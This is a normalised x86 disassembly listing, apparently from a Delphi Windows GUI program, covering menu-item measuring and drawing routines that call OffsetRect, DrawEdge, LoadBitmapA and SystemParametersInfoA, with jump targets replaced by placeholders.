mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_456c7c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4577bb
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_455d40
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_456c7c
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_4577d4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_4580dc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42477c
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_4240e4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_423918
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4043f4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_4240e4
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42477c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_453c90
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424b20
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4240dc
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_4240e4
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_4240e4
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42477c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4240dc
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_4293e4
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4240b8
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42477c
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42477c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_427218
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_457c1f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_4283e0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_423918
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_453c90
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4240e4
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_456c7c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x5c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_423be4
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424b20
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424900
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_453f80
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424b20
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_42469c
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_423918
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403270
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_456c7c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4580e3
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_455d40
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_424980
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ ebp - 0x4 ]
call sub_456c7c
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_458230
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_458c14
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_458260
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_4582ac
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_45848e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xfff2
call sub_40346c
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
push ebp
call sub_458260
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax edi
call sub_458c14
mov esi eax
mov eax edi
call sub_458230
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_4043f4
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
test bl bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402c84
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov bl [ esi + 0x60 ]
jmp r-xdata
mov si [ edi + 0x60 ]
test si si
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_404080
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_455d40
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_4042f4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458495
lea eax [ ebp - 0x24 ]
call sub_403fe8
lea eax [ ebp - 0x10 ]
call sub_403fe8
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ edi + 0xa4 ]
call [ edi + 0xa0 ]
xor eax eax
mov al bl
mov ax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
lea edx [ ebp - 0x20 ]
push edx
push 0x0
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_456c7c
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
cmp [ edi + 0xa2 ] 0x0
je r-xdata
sub_4584c0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_4043f4
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_40403c
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4584e8
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_458658
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_458668
cmp ebx eax
je r-xdata
mov dl [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_458530
sub_458530
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
